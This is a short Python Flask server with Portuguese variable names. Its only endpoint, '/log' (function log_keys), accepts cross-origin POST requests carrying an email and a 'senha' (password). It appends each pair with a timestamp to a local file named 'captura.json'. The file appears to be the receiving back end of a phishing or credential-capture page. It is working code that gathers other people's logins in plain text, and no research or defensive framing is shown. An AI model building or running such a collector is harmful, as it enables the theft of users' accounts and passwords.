from flask import Flask, request
from flask_cors import CORS
import json
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ARQUIVO_LOG = os.path.join(BASE_DIR, 'captura.json')

@app.route('/log', methods=['POST'])
def log_keys():
    data = request.get_json()
    email = data.get('email', '')
    senha = data.get('senha', '')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(ARQUIVO_LOG, 'a', encoding='utf-8') as f:
        json.dump({
            "timestamp": timestamp,
            "email": email,
            "senha": senha
        }, f)
        f.write('\n')

    return {'status': 'ok'}, 200

if __name__ == '__main__':
    app.run(port=5000)
